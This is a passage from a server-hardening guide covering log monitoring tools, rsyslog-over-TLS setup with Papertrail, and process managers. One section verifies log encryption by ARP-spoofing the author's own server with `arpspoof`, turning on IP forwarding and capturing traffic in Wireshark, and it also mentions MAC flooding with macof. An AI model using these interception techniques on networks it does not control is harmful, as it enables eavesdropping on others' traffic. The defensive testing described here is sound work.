* [Simple Log Watcher](https://sourceforge.net/projects/swatch/)  
It used to be called Swatch (Simple Watchdog) before being asked to change its name by the Swiss watch company of the same name. It's a Perl script that monitors a log file for each instance you run (or schedule), matches your defined regular expression patterns based on the configuration file which defaults to `~/.swatchrc`, and performs any action you can script. You can define different message types with different font styles and colours. Simple Log Watcher can tail the log file, so your actions can be performed in real-time.  
  
For each log file you want to monitor, you need a separate `swatchrc` file and a separate instance of Simple Log Watcher, as it only takes one file argument. If you want to monitor a lot of log files without aggregating them, this could get messy.  
  
See the [Additional Resources](#additional-resources-vps-countermeasures-lack-of-visibility-logging-and-alerting-swatch) chapter.  
  
* [Logcheck](https://packages.debian.org/stretch/logcheck)  
Logcheck monitors system log files, and emails anomalies to an administrator. Once [installed](https://linuxtechme.wordpress.com/2012/01/31/install-logcheck/) it needs to be set-up to run periodically with cron. It is not a real-time monitor, which may significantly reduce its usefulness in catching an intruder before they obtain their goal, or get a chance to modify the logs that logcheck would review. The Debian Manuals have [details](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-custom-logcheck) on how to use and customise logcheck. Most of the configuration is stored in `/etc/logcheck/logcheck.conf`. You can specify which log files to review within the `/etc/logcheck/logcheck.logfiles`. Logcheck is easy to install and configure.  
  
* [Logwatch](https://packages.debian.org/stretch/logwatch)  
Logwatch is similar to Logcheck, it monitors system logs but not continuously, so they could be open to modification before Logwatch reviews them, thus rendering Logwatch ineffective. Logwatch targets a similar user base to Simple Log Watcher and Logcheck from above, it can review all logs within a certain directory, all logs from a specified collection of services, and single log files. Logwatch creates a report of what it finds based on your level of paranoia, and can email to the sysadmin. It is easy to set-up and get started though. Logwatch is available in the debian repositories and the [source](https://sourceforge.net/p/logwatch/git/ci/master/tree/) is available on SourceForge.  
  
* [Logrotate](https://packages.debian.org/stretch/logrotate)  
Use [logrotate](http://www.rackspace.com/knowledge_center/article/understanding-logrotate-utility) to make sure your logs will be around long enough to examine them. There are some usage examples  
here: [http://www.thegeekstuff.com/2010/07/logrotate-examples/](http://www.thegeekstuff.com/2010/07/logrotate-examples/). Logrotate ships with Debian, it's just a matter of reviewing the default configuration and applying any extra configuration that you require specifically.  
  
* [Logstash](https://www.elastic.co/products/logstash)  
Logstash targets a similar problem as logrotate, but goes a lot further in that it routes, and has the ability to translate between protocols. Logstash has a rich plugin ecosystem, with integrations provided by both the creators (Elastic) and the open source community. As with the above offerings, Logstash is free and open source (FOSS). I consider Logstash's Java dependency a major disadvantage.  
  
* [Fail2ban](http://www.fail2ban.org/wiki/index.php/Main_Page)  
Fail2ban bans hosts that cause multiple authentication errors, or just email events. You need to be conscious of false positives here. An attacker can spoof many IP addresses, potentially causing them all to be banned, thus creating a DoS. Fail2ban has been around for at least 12 years, and is actively maintained, and written in [Python](https://github.com/fail2ban/fail2ban/). There is also a web UI written in NodeJS called [fail2web](https://github.com/Sean-Der/fail2web).  
  
* [Multitail](https://packages.debian.org/stretch/multitail)  
Multitail does exactly what its name says, it tails multiple log files at once and shows them in a terminal while providing real-time multi-log file monitoring. It's great for seeing strange happenings before an intruder has time to modify logs, assuming you are keeping watch. Multitail is good for a single system or small number of systems if you have spare screens available.  
  
* [Papertrail](https://papertrailapp.com/)  
Papertrail is similar to MultiTail, except that it collects logs from as many servers as you want, and streams them off-site to the Papertrail service, then aggregates them into a single, easily searchable web interface, allowing you to set up alerts on any log text. Papertrail has a free plan providing 100MB per month, which is enough for some purposes. The plans are reasonably cheap for the features it provides, and can scale as you grow. I have used this in production environments (as discussed soon), and have found it to be a tool that does not try to do too much, and does what it does well.

#### Web Server Log Management {#vps-countermeasures-lack-of-visibility-web-server-log-management}
![](images/ThreatTags/PreventionAVERAGE.png)

##### System Loggers Reviewed

**GNU syslogd**

I am not sure if GNU syslogd remains under active development, most GNU/Linux distributions no longer ship with it. It only supports UDP and lacks features. From what I gather it's single-threaded. I did not spend long looking at it as there was not much point in doing so. The following two offerings are the current players in the space.

**Rsyslog**

Rsyslog ships with Debian as most other GNU/Linux distributions do now. I like to do as little as possible to achieve goals, and rsyslog fits this description for me. The [rsyslog documentation](http://www.rsyslog.com/doc/master/index.html) is good. Rainer Gerhards wrote rsyslog and his [blog](http://blog.gerhards.net/2007/08/why-does-world-need-another-syslogd.html) provides many good insights into all things system logging. Rsyslog supports UDP, TCP, and TLS. There is also the Reliable Event Logging Protocol (RELP), which Rainer created. Rsyslog is great at gathering, transporting, storing log messages and includes some really neat functionality for dividing the logs. It is not designed to alert on logs. That is where the likes of Simple Event Correlator ([SEC](http://www.gossamer-threads.com/lists/rsyslog/users/6044)) comes in, as discussed [below](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy). Rainer Gerhards discusses why TCP is not as reliable as many [think](http://blog.gerhards.net/2008/04/on-unreliability-of-plain-tcp-syslog.html).

**Syslog-ng**

I do not spend too long here, as I did not see any features that I needed that were better than default rsyslog. Syslog-ng can correlate log messages, both real-time and offline, and supports reliable and encrypted transport using TCP and TLS. It also provides message filtering, sorting, pre-processing, log normalisation.

##### Goals

* Record events and have them securely transferred to another syslog server in real-time, or as close to it as possible, so that potential attackers do not have time to modify them on the local system before they are replicated to another location
* Reliability: resilience / ability to recover connectivity. No messages lost
* Privacy: log messages should not be able to be read in transit
* Integrity: log messages should not be able to be tampered with or modified in transit. Integrity on the file-system is covered in other places in this chapter, such as in sections "[Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)" and "[Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions)"
* Extensibility: ability to add more machines and be able to aggregate events from many sources on [many machines](#network-countermeasures-lack-of-visibility-insufficient-logging)
* Receive notifications from the upstream syslog server of specific events. No [Host Intrusion Detection System (HIDS)](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) is going to negate the need to rebuild your system if you are not notified in time, and an attacker plants and activates their rootkit
* Receive notifications from the upstream syslog server of a lack of events. If you expect certain events to usually occur, but they have stopped, you want to know about it

##### Environmental Considerations {#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations}

You may have devices in your network topology such as routers, switches, and access points (APs) that do not have functionality to send their system logs via TCP, opting to use an unreliable transport such as UDP, without any form of confidentiality. As this is not directly related to VPS, I will defer this portion to the [Insufficient Logging](#network-countermeasures-lack-of-visibility-insufficient-logging) countermeasures section within the Network chapter.

##### Initial Setup {#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up}

%% This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.

Configure rsyslog to use TCP, with local queuing over TLS to Papertrail for your syslog collection, aggregation and reporting. Papertrail does not support RELP, but say that is because their clients have not seen issues with reliability in TCP over TLS for local queuing. My personal experience is that the comparison of what is being sent to Papertrail in regards to what is being received does not always match.

As I was setting this up and watching both ends of the transaction we had an internet outage of just over an hour. At that stage we had very few events being generated, so it was trivial to verify both ends after the outage. I noticed that, once the ISP's router was back online, and the events from the queue moved to Papertrail, there was, in fact, one missing.

Why did Rainer Gerhards create RELP if TCP with queues was good enough? That was a question on my mind for a while. In the end, it was obvious that TCP without RELP is not good enough if you want your logs to maintain integrity. Simply, it appears that queues may lose messages. Rainer Gerhards [said](http://ftp.ics.uci.edu/pub/centos0/ics-custom-build/BUILD/rsyslog-3.19.8/doc/rsyslog_reliable_forwarding.html) that “_In rsyslog, every action runs on its own queue and each queue can be set to buffer data if the action is not ready. Of course, you must be able to detect that the action is not ready, which means the remote server is off-line. This can be detected with plain TCP syslog and RELP_“, thus it can be detected without RELP.

You can [aggregate](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_aggregate_log_files) log files with rsyslog, or by using Papertrail's `remote_syslog` daemon.

Alerting is available, including for [inactivity of events](http://help.papertrailapp.com/kb/how-it-works/alerts/#inactivity).

Papertrail's documentation is good and its support is reasonable. Due to the huge amounts of traffic they have to deal with, they are unable to troubleshoot any issues you may have. If you still want to go down the Papertrail path, to get started, work through ([https://papertrailapp.com/systems/setup](https://papertrailapp.com/systems/setup)) which sets up your rsyslog to use UDP (specified in the `/etc/rsyslog.conf` by a single ampersand in front of the target syslog server). I wanted something more reliable than that, so I use two ampersands, which specifies TCP.

As we are sending logs over the Internet and need TLS, check Papertrail "[Encrypting with TLS](http://help.papertrailapp.com/kb/configuration/encrypting-remote-syslog-with-tls-ssl/#rsyslog)" docs. Check Papertrail's CA server bundle for integrity:

{linenos=off, lang=bash}
    curl https://papertrailapp.com/tools/papertrail-bundle.pem | md5sum

This should match with Papertrail's "Encrypting with TLS" page. First problem here: the above mentioned page that lists the MD5 checksum is being served unencrypted, even if you force the use of `https` the result is an invalid certificate error. My advice would be to contact Papertrail directly and ask them what the MD5 checksum should be. Make sure it is the same as what the above command produces.

If it is, then put the contents of that URL into a file called `papertrail-bundle.pem`, then [`scp`](https://blog.binarymist.net/2012/03/25/copying-with-scp/) the `papertrail-bundle.pem` to the web server's `/etc` directory. The command will depend on whether you are already on the web server and you want to pull, or whether you are somewhere else and want to push. Make sure the ownership is correct on the pem file.

{linenos=off, lang=bash}
    chown root:root papertrail-bundle.pem

install `rsyslog-gnutls`:

{linenos=off, lang=bash}
    apt-get install rsyslog-gnutls

Add the TLS config:

{linenos=off, lang=bash}
    $DefaultNetstreamDriverCAFile /etc/papertrail-bundle.pem # trust these CAs
    $ActionSendStreamDriver gtls # use gtls netstream driver
    $ActionSendStreamDriverMode 1 # require TLS
    $ActionSendStreamDriverAuthMode x509/name # authenticate by host-name
    $ActionSendStreamDriverPermittedPeer *.papertrailapp.com

to your `/etc/rsyslog.conf`. Create an egress rule for your router to let traffic out to destination port `39871`.

{linenos=off, lang=bash}
    sudo service rsyslog restart

To generate a log message that uses your system syslogd config `/etc/rsyslog.conf`, run:

{linenos=off, lang=bash}
    logger "hi"

This should have logged `hi` to `/var/log/messages` and to [https://papertrailapp.com/events](https://papertrailapp.com/events), but it did not.

**Time to Troubleshoot**

Keep an eye on `/var/log/messages`, where our log messages should be written to for starters. In one terminal run the following:

{linenos=off, lang=bash}
    # Show a live update of the last 10 lines (by default) of /var/log/messages
    sudo tail -f [-n <number of lines to tail>] /var/log/messages

Let's run rsyslog in config checking mode:

{linenos=off, lang=bash}
    /usr/sbin/rsyslogd -f /etc/rsyslog.conf -N1

If the config is OK, the output will look like:

{linenos=off, lang=bash}
    rsyslogd: version <the version number>, config validation run (level 1), master config /etc/rsyslog.conf
    rsyslogd: End of config validation run. Bye.

Some of the troubleshooting resources I found were:

1. [https://www.loggly.com/docs/troubleshooting-rsyslog/](https://www.loggly.com/docs/troubleshooting-rsyslog/)
2. [http://help.papertrailapp.com/](http://help.papertrailapp.com/)
3. [http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/](http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/)
4. `/usr/sbin/rsyslogd -version` will provide the installed version and supported features.

The Papertrail help was not that helpful, as we do not, and should not have Telnet installed, we removed it, [remember](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet)? I cannot ping from the DMZ as ICMP egress is not whitelisted and I am not going to install tcpdump or strace on a production server. The more you have running, the more surface area you have, the greater the opportunities for exploitation; good for attackers, bad for defenders.

So how do we tell if rsyslogd is actually running if it does not appear to be doing anything useful?

{linenos=off, lang=bash}
    pidof rsyslogd
    # or
    /etc/init.d/rsyslog status

Showing which files rsyslogd has open can be useful:

{linenos=off, lang=bash}
    lsof -p <rsyslogd pid>
    # or just combine the results of pidof rsyslogd:
    sudo lsof -p $(pidof rsyslogd)

To start with, this produced output such as:

{linenos=off, lang=bash}
    rsyslogd 3426 root 8u IPv4 9636 0t0 TCP <your server IP>:<sending port>->logs2.papertrailapp.com:39871 (SYN_SENT)

This obviously showed rsyslogds `SYN` packets were not getting through. I had some discussion with Troy from Papertrail support about the reliability of TCP over TLS without RELP. I think if the server is business critical, then [Improving the Strategy](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy) maybe required. Troy assured me that they had never had any issues with logs being lost due to the absence of RELP. Troy also pointed me to their recommended [local queue options](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_queue). After adding the queue tweaks and a rsyslogd restart, the above command now produced output such:

{linenos=off, lang=bash}
    rsyslogd 3615 root 8u IPv4 9766 0t0 TCP <your server IP>:<sending port>->logs2.papertrailapp.com:39871 (ESTABLISHED)

I could now see events in the Papertrail web UI in real-time.

Socket Statistics (`ss`) (the better `netstat`) should also show the established connection.

By default, Papertrail accepts TCP over TLS (TLS encryption checkbox on, plain text checkbox off) and UDP. If your TLS is not set up properly, your events will not be accepted by Papertrail. Following is how I confirmed this to be true:

{#confirm-that-our-logs-are-commuting-over-tls}
**Confirm that our Logs are Commuting over TLS**

We can do this without installing anything on the web server or router, or physically touching the server sending packets to Papertrail, or the router. Use a switch (ubiquitous) rather than a hub, and no tap or multi-network interfaced computer. Commonly there is no switch monitoring port available on expensive enterprise grade switches (along with the much needed access). I was down to two approaches here that I could think of, and I like to achieve as much as possible with the least amount of work, as such I could not be bothered getting out of my chair and walking to the server rack.

1. MAC flooding with the help of [macof](http://linux.die.net/man/8/macof), which is a utility from the dsniff suite. This essentially causes your switch to go into a fail open mode where it acts like a hub and broadcasts its packets to every port.  
    
    ![](images/MItMMACFlod.png)  
    
2. Man In the Middle (MItM) with some help from [ARP spoofing](#network-identify-risks-spoofing-website) or [poisoning](http://thevega.blogspot.co.nz/2008_06_01_archive.html). I decided to choose the second option, as it is a little more elegant.  
    
    ![](images/MItMARPSpoof.png)

On our MItM box, I set a static `IP`: `address`, `netmask`, `gateway` in `/etc/network/interfaces` and added `domain`, `search` and `nameservers` to the `/etc/resolv.conf`.

Follow that up with a `service network-manager restart`.

On the web server, run: `ifconfig -a` to get MAC: `<your server MAC>`.

On the MItM box, run the same command, to get MAC: `<MItM box MAC>`.

On web server, run: `ip neighbour` to find MAC addresses associated with IP addresses (the local ARP table). Router will be: `<router MAC>`.

{linenos=off, lang=bash}
    you@your_server:~$ ip neighbour
    <MItM box IP> dev eth0 lladdr <MItM box MAC> REACHABLE
    <router IP> dev eth0 lladdr <router MAC> REACHABLE

Now you need to turn your MItM box into a router temporarily. On the MItM box run:

{linenos=off, lang=bash}
    cat /proc/sys/net/ipv4/ip_forward

If forwarding is on, you will see a `1`. If it is not, add a `1` into the file:

{linenos=off, lang=bash}
    echo 1 > /proc/sys/net/ipv4/ip_forward

and check again to make sure forwarding is on. Now on the MItM box run:

{linenos=off, lang=bash}
    arpspoof -t <your server IP> <router IP>

This will continue to notify `<your server IP>` that our MItM box MAC address belongs to `<router IP>`. For all intents and purposes, we (MItM box) are now `<router IP>` to the `<your server IP>` box, but our IP address does not change. Now on the web server you can see that its ARP table has been updated and because `arpspoof` keeps running, it keeps telling `<your server IP>` that our MItM box is the router.

{linenos=off, lang=bash}
    you@your_server:~$ ip neighbour
    <MItM box IP> dev eth0 lladdr <MItM box MAC> STALE
    <router IP> dev eth0 lladdr <MItM box MAC> REACHABLE

Now on our MItM box, while our `arpspoof` continues to run, we [start Wireshark](https://blog.binarymist.net/2013/04/13/running-wireshark-as-non-root-user/) listening on our `eth0` interface or what ever interface you are bound to. You can see that all packets that the web server is sending, we are intercepting and forwarding (routing) on to the gateway.

Wireshark clearly showed that the data was encrypted. I commented out the five TLS config lines in the `/etc/rsyslog.conf` file then saved and restarted rsyslog. I turned on plain text in Papertrail and could now see the messages in clear text. When I turned off Plain text, Papertrail would no longer accept syslog events. Excellent!

One of the nice things about `arpspoof` is that it re-applies the original ARP mappings once it is done.

You can also tell `arpspoof` to poison the router's ARP table. This way any traffic going to the web server via the router, not originating from the web server, will be routed through our MItM box.

Do not forget to revert the change to `/proc/sys/net/ipv4/ip_forward`.

**Exporting Wireshark Capture**

You can use the File->Save As... option here for a collection of output types. The way I usually do it is:

1. First completely expand all the frames you want visible in your capture file
2. File -> Export Packet Dissections -> as a plain text file
3. Check the All packets checkbox
4. Check the Packet summary line checkbox
5. Check the Packet details checkbox and the As displayed
6. OK

**Trouble-shooting Messages that Papertrail Never Shows**

A> To run rsyslogd in [debug](http://www.rsyslog.com/doc/v5-stable/troubleshooting/troubleshoot.html#debug-log)

Check to see which arguments get passed into rsyslogd to run as a daemon in `/etc/init.d/rsyslog` and `/etc/default/rsyslog`. You will probably see `RSYSLOGD_OPTIONS=""`. There may be some arguments between the quotes.

{linenos=off, lang=bash}
    sudo service rsyslog stop
    sudo /usr/sbin/rsyslogd [your options here] -dn >> ~/rsyslog-debug.log

The debug log can be quite useful for troubleshooting. Also keep your eye on the stderr as you can see if it is writing anything out (most system startup scripts throw this away). Once you have finished collecting the log: [CTRL]+[C]

{linenos=off, lang=bash}
    sudo service rsyslog start

To see if rsyslog is running:

{linenos=off, lang=bash}
    pidof rsyslogd
    # or
    /etc/init.d/rsyslog status

A> Turn on the [impstats](http://www.rsyslog.com/doc/master/configuration/modules/impstats.html) module

The stats it produces show when you run into errors with an output, and also the state of the queues. You can also run impstats on the receiving machine if it is in your control. Papertrail obviously is not. Put the following into your `rsyslog.conf` file at the top and restart rsyslog:

{linenos=off, lang=bash}
    # Turn on some internal counters to trouble-shoot missing messages
    module(load="impstats"
    interval="600"
    severity="7"
    log.syslog="off"
     
    # need to turn log stream logging off
    log.file="/var/log/rsyslog-stats.log")
    # End turn on some internal counters to trouble-shoot missing messages

Now if you get an error such as:

{linenos=off, lang=bash}
    rsyslogd-2039: Could not open output pipe '/dev/xconsole': No such file or directory [try http://www.rsyslog.com/e/2039 ]

you can just change the `/dev/xconsole` to `/dev/console`. Xconsole is still in the config file for legacy reasons, it has not been cleaned up by the package maintainers.

A> GnuTLS error in rsyslog-debug.log

By running rsyslogd manually in debug mode, I found an error when the message failed to send:

{linenos=off, lang=bash}
    unexpected GnuTLS error -53 in nsd_gtls.c:1571

Standard Error when running rsyslogd manually produces:

{linenos=off, lang=bash}
    GnuTLS error: Error in the push function

With some help from the GnuTLS mailing list:

“_That means that send() returned -1 for some reason._” You can enable more output by adding an environment variable `GNUTLS_DEBUG_LEVEL=9` prior to running the application, and that should at least provide you with the `errno`. This does not provide any more detail to stderr. However, [thanks to Rainer](https://github.com/rsyslog/rsyslog/issues/219) we do now have the [debug.gnutls parameter](https://github.com/jgerhards/rsyslog/commit/9125ddf99d0e5b1ea3a15a730fc409dd27df3fd9) in the rsyslog code. If you specify this global variable in the `rsyslog.conf` and assign it a value between 0-10 you will have gnutls debug output going to rsyslog's debug log.

##### Improving the Strategy {#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy}

With the above strategy, I had issues where messages were getting lost between rsyslog and Papertrail and I spent over a week trying to find the cause. As the sender, you have no insight into what Papertrail is doing. The support team could not provide much insight into their service when I had to troubleshoot things. They were as helpful as they could be though.

Reliability can be significantly improved using RELP. Papertrail does not support RELP, so a next step could be to replace Papertrail with a local network instance of an rsyslogd collector and Simple Event Correlator ([SEC](https://simple-evcorr.github.io/)). Notification for inactivity of events could be performed by cron and SEC. Then, for all your graphical event correlation, you could use [LogAnalyzer](http://loganalyzer.adiscon.com/), also created by Rainer Gerhards (rsyslog author). This would be more work to set up than an online service you do not have to set up. In saying that, you would have greater control and security which for me is the big win here.
[Normalisation](http://www.liblognorm.com/) also from Rainer could be useful.

Another option, instead of going through all the work of having to setup and configure a local network instance of an rsyslogd collector, SEC and perhaps LogAnalyzer, would be just to deploy the SyslogAppliance which is a turnkey VM already configured with all the tools you would need to collect, aggregate, report and alert, as discussed in the Network chapter under Countermeasures, [Insufficient Logging](#network-countermeasures-lack-of-visibility-insufficient-logging).

What I found, is that after several upgrades to rsyslog, the reliability issues seemed to improve, making me think that changes to rsyslog were possibly and probably responsible.

#### Proactive Monitoring {#vps-countermeasures-lack-of-visibility-proactive-monitoring}
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an indepth evaluation of a collection of tools, whose functionality was monitoring and performing actions on processes and applications. Some of these tools are very useful for security focused tasks as well as generic DevOps.

**New Relic**

New Relic is a Software as a Service (SaaS) provider that offers many products, primarily in the performance monitoring space, rather than security. Their offerings aren't free, but may come into their own in larger deployments. I have used New Relic, it has been quick to provide useful performance statistics on servers, and helped my team isolate resource constraints.

**Advanced Web Statistics ([AWStats](http://www.awstats.org/))**

Unlike NewRelic which is SaaS, AWStats is FOSS. It fits a similar market space as NewRelic though. You can find the documentation  
here: [http://www.awstats.org/docs/index.html](http://www.awstats.org/docs/index.html).

**Pingdom**

Pingdom is similar to New Relic but not as feature rich. As discussed below, [Monit](http://slides.com/tildeslash/monit#/7) is a better alternative.

&nbsp;

All the following offerings that I evaluated, target different scenarios. I have listed the pros and cons for each of them and where I think they fit as a potential solution to monitor your web applications (I am leaning toward NodeJS) and make sure they run in a healthy state. I have listed the [goals](#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals) I was looking to satisfy.

I have to have a good knowledge of the landscape before I commit to a decision and stand behind it. I like to know that I have made the best decision based on all the facts that are publicly available. Therefore, as always, it is my responsibility to make sure I have done my research in order to make an informed and sound decision. I believe my evaluation was unbiased as I had not used any of the offerings other than [forever](#vps-countermeasures-lack-of-visibility-proactive-monitoring-forever) before.

I looked at quite a few more than what I have detailed below, but these I felt were worth spending some time on.

Keep in mind, that everyone's requirements will be different, so rather than telling you which one to use (as I do not know your situation), I have listed the attributes (positive, negative and neutral) that I think are worth considering when making this choice. After the evaluation, we make some decisions and start the [configuration](#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit) of the chosen offerings.

##### Evaluation Criteria

1. Who is the creator? I favour teams rather than individuals. Teams are less likely to be side-tracked and affected by external influences. If an individual abandons a project, where does that leave the product? With that in mind, there are some very passionate and motivated individuals running very successful projects.
2. Does it do what we need it to do? [Goals](#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals) address this.
3. Do I foresee any integration problems with other required components, and how difficult are the relationships likely to be?
4. Cost (financial). Is it free? I usually gravitate toward free software. It is typically an easier sell to clients and management. Are there catches once you get further down the road? Usually open source projects are marketed as is, so although it costs you nothing up front, what is it likely to cost in maintenance? Do you have the resources to support it?
5. Cost (time). Is the setup painful?
6. How well does it appear to be supported? What do other users say?
7. Documentation. Is there any/much? What is its quality? Is the user experience so good that little documentation is required?
8. Community. Does it have an active one? Are the users getting their questions answered satisfactorily? Why are the unhappy users unhappy (do they have a valid reason)?
9. Release schedule. How often are releases being made? When was the last release? Is the product mature, does it need any work?
10. Gut feeling, intuition. How does it feel? If you have experience in making these sorts of choices, lean on it. Believe it or not, this may be the most important criteria for you.

The following tools were my choices based on the above criterion.

##### Goals {#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals}

1. Application should start automatically on system boot
2. Application should restart if it dies or becomes unresponsive
3. The person responsible for the application should know if a trojanised version of the application is swapped in, or even if your file timestamps have changed
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy (Nginx, node-http-proxy, Tinyproxy, Squid, Varnish, etc)
    2. Clustering and providing load balancing for a single threaded application
    3. Visibility to [application statistics](#vps-countermeasures-lack-of-visibility-statistics-graphing) as we discuss a little later.
5. Enough documentation to feel comfortable consuming the offering
6. The offering should be production ready. This means that it is mature with a security conscious architecture and features, rather than some attempt at retrofitted security after the fact. Do the developers think and live security, and thus bake it in from the start?

##### Sysvinit, [Upstart](http://upstart.ubuntu.com/), [systemd](https://freedesktop.org/wiki/Software/systemd/) & [Runit](http://smarden.org/runit/) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit}

You will have one of these running on a standard GNU/Linux system.

These are system and service managers for Linux. Upstart, and the later systemd were developed as replacements for the traditional init daemon (Sysvinit), which all depend on init. Init is an essential package that pulls in the default init system. In Debian, starting with Jessie, [systemd](https://wiki.debian.org/systemd) is your default system and service manager.

There is helpful info on the [differences](https://doc.opensuse.org/documentation/html/openSUSE_122/opensuse-reference/cha.systemd.html) between Sysvinit and systemd, and links in the attributions chapter.

{#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit-systemd}
**systemd**  

As I have systemd installed out of the box on my test system (Debian Stretch), I will be using this for my setup.

**Documentation**

There is a well written [comparison](http://www.tuicool.com/articles/qy2EJz3) of Upstart, systemd, Runit, and Supervisor.

The below commands will provide good details on how these packages interact with each other:

{linenos=off, lang=bash}
    aptitude show sysvinit
    aptitude show systemd
    # and any others you think of

These system and service managers all run as `PID 1` and start the rest of your system. Your Linux system will more than likely be using one of these to start tasks and services during boot, stop them during shutdown, and supervise them while the system is running. Ideally, you are going to want to use something higher level to look after your NodeJS application(s). See the following candidates.

##### [forever](https://github.com/foreverjs/forever) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-forever}

forever and its [web UI](https://github.com/FGRibreau/forever-webui) can run any kind of script continuously (whether it is written in NodeJS or not). This was not always the case though. It was originally targeted towards keeping NodeJS applications running.

forever requires NPM to [install globally](https://www.npmjs.com/package/forever). We already have a package manager on Debian, and all other mainstream Linux distros. Even Windows has package managers. Installing NPM just adds more attack surface area. Unless it is essential, I would rather do without NPM on a production server where we are actively working to [reduce the installed package count](#vps-countermeasures-disable-remove-services-harden-what-is-left) and [disable](#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim) everything else we can. We could install forever on a development box and then copy to the production server, but it starts to turn the simplicity of a node module into something not as simple. This then makes native offerings such as [Supervisor](#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor), [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) and [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger) look even more attractive.

**[Does it Meet Our Goals?](#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals)**

1. Not without an extra script such as crontab or similar
2. The application will restart if it dies, but if its response times go up, forever is not going to help as it has no way of knowing
3. forever provides no file integrity or timestamp checking, so there is nothing that prevents known good application files being swapped for trojanised counterfeits with forever
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: No problem
    2. Integrate NodeJS's core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing
    3. Visibility to application statistics could be added later with the likes of [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) or something else, but if you use Monit, then there would be no need for forever. Monit does the little that forever does and is capable of so much more, but is not pushy on what to do and how to do it. All the behaviour is defined with quite a nice syntax in a config file or as many as you like.
5. There is enough documentation to feel comfortable consuming forever, as forever does not do a lot
6. The code itself is probably production ready, but I have heard quite a bit about stability issues. You are also expected to have NPM installed (more attack surface) when we already have native package managers on the server(s).

**Overall Thoughts**

I am looking for a tool set that is a little smarter, knows when the application is struggling, and when someone has tampered with it. Forever does not satisfy these requirements. There is often a balancing act between not doing enough and doing too much. If the offering "can" do too much but do so in a manner that doesn't get in your way, then it's not so bad, you do not have to use all the features. In saying that, it is extra attack surface area that can and will be exploited, it's just a matter of time.

##### [PM2](http://pm2.keymetrics.io/)

PM2 is younger than forever, but seems to have quite a few more features. I am not sure about production-ready though, let's elaborate.

I prefer the dark cockpit approach with my monitoring tools. By this I mean, I do not want to be told that everything is OK all the time. I only want to be notified when things are not OK. PM2 provides a display of memory and CPU usage for each app with `pm2 monit`. I do not have the time to sit around watching statistics that don't need to be watched, and neither do most system administrators. Besides, when we do want to do this, we have perfectly good native tooling that system administrators are comfortable using. Amongst the list of [commands that PM2 provides](https://github.com/Unitech/pm2#commands-overview), most of this functionality can be performed by native tools, so I am not sure what benefit this adds.

PM2 also seems to [provide logging](https://github.com/Unitech/pm2#log-facilities). My applications provide their [own logging](#web-applications-countermeasures-lack-of-visibility-insufficient-logging) and we have the system's [logging](#vps-countermeasures-lack-of-visibility-logging-and-alerting), which provides aggregate and singular logs, so again I struggle to see what PM2 is offering here that we do not already have.

As mentioned on the [GitHub](https://github.com/Unitech/pm2) README: “_PM2 is a production process manager for Node.js applications with a built-in load balancer_“. Initially, this sounds and looks shiny. Very quickly though, you should realise there are a few security issues you need to be aware of.

The word “production” is used but it requires NPM to install globally. We already have a package manager on Debian and all other main-stream Linux distros. As previously mentioned, installing NPM adds unnecessary attack surface area. Unless it is essential, and it should not be, we really do not want another application whose sole purpose is to install additional attack surface in the form of extra packages. NPM contains a huge number of packages, we really do not want these on a production server facing the Internet. We could install PM2 on a development box and then copy it to the production server, but it starts to turn the simplicity of a node module into something not as simple. As with forever, this makes offerings such as [Supervisor](#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor), [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) and [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger) look even more attractive.

At the time of writing this, PM2 is about four years old with about 440 open issues on GitHub, most quite old, with 29 open pull requests.

Yes, it is very popular currently, but that does not tell me it is ready for production though, it tells me that the marketing is working.

"[Is your production server ready for PM2](https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md#is-my-production-server-ready-for-pm2)?" That phrase alone tells me the mind-set behind the project. I would much sooner see it worded the other way around. Is PM2 ready for my production server? Your production server(s) are what you have spent time hardening, I am not personally about to compromise that work by consuming a package that shows me no sign of upfront security considerations in the development of this tool. You are going to need a development server for this, unless you honestly want development tools installed on your production server (NPM, git, build-essential and NVM) on your production server? Not for me or my clients thanks. If you feel compelled to do so, put them in Docker containers instead.

**Features that Stand Out**

They are listed on the GitHub repository. Just beware of some of the caveats. For [load balancing](https://github.com/Unitech/pm2#load-balancing--0s-reload-downtime): “_we recommend the use of node#0.12.0+ or node#0.11.16+. We do not support node#0.10.*'s cluster module anymore_”. 0.11.16 is unstable, but hang on, I thought PM2 was a “production” process manager?

On top of NodeJS, PM2 will run scripts in the following languages: bash, python, ruby, coffee, php, perl.

